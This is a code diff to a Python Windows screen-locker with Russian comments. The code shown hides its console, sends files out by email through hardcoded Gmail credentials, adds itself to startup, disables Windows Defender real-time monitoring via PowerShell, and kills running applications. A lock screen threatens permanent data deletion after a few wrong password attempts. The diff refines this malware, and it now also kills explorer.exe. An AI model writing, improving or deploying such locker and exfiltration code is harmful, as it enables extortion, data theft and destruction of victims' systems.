@@ -24,17 +24,12 @@ CHECK_INTERVAL = 15
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
 
-# ===== СКРЫТИЕ =====
+# ===== СКРЫТИЕ CMD (ИСПРАВЛЕНО) =====
 def hide_console():
     try:
-        if sys.executable.endswith("python.exe"):
-            pw = sys.executable.replace("python.exe", "pythonw.exe")
-            if os.path.exists(pw):
-                subprocess.Popen([pw, __file__] + sys.argv[1:], creationflags=0x08000000)
-                os._exit(0)
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
-        ctypes.windll.kernel32.FreeConsole()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
     except: pass
 
 # ===== WIN LOCK =====
@@ -77,7 +72,7 @@ def send_file_email(fp, desc):
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
 
-# ===== АВТОЗАГРУЗКА 3 МОДУЛЕЙ =====
+# ===== АВТОЗАГРУЗКА =====
 def add_all_to_startup():
     try:
         cp = os.path.abspath(__file__)
@@ -120,9 +115,9 @@ def bypass_defender():
             os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
     except: pass
 
-# ===== ЗАКРЫТИЕ ВСЕХ ПРИЛОЖЕНИЙ =====
+# ===== ЗАКРЫТИЕ ПРИЛОЖЕНИЙ =====
 def kill_all_apps():
-    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe','explorer.exe']
+    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe']
     try:
         result = subprocess.check_output('tasklist /FO CSV /NH', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
         for line in result.split('\n'):
@@ -603,7 +598,7 @@ class WinLocker:
             img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
             with open(img_path, "wb") as f: f.write(img_data)
             img = PhotoImage(file=img_path)
-            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.1, anchor='center')
+            tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.08, anchor='center')
             self.win._img = img
         except: pass
         
@@ -632,7 +627,7 @@ class WinLocker:
 У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ.
 НЕ УГАДАЕШЬ — ДАННЫЕ УДАЛЕНЫ НАВСЕГДА."""
         
-        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.48, anchor='center')
+        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.45, anchor='center')
         
         cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.85, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier',14,'bold')).pack(pady=(0,5))
